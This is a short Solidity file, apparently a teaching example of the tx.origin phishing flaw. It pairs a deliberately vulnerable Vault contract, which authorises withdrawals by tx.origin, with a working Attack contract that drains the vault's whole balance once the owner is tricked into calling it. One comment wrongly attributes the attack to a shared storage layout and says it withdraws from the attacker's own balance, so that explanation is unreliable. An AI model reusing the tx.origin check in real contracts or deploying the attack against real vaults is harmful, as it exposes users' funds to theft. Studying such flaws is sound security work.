// SPDX -License-Identifier: GPL-3.0
pragma solidity ^0.8.28;

// tx.origin is the original address that started the transaction
// msg.sender is the address that called the function

// Attacker tricks the vault owner into calling Attack.attack()
// Attack.attack() calls vault.withdraw()
// vault.withdraw() sends all the ETH to Attack

contract Vault {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function withdraw(address payable _to, uint256 _amount) public payable {
        require(tx.origin == owner, "Not owner");

        (bool sent,) = _to.call{value: _amount}("");
        require(sent, "Failed to send ETH");
    }
}

contract Attack {
    // Attack contract has the same storage layout as Vault
    // So when attack withdraws, it withdraws from its own balance
    address payable public owner;

    // vault is the address of the vault contract
    Vault vault;

    constructor(Vault _vault, address _owner) {
        vault = Vault(_vault);
        owner = payable(_owner);
    }

    function attack() public {
        vault.withdraw(owner, address(vault).balance);
    }
}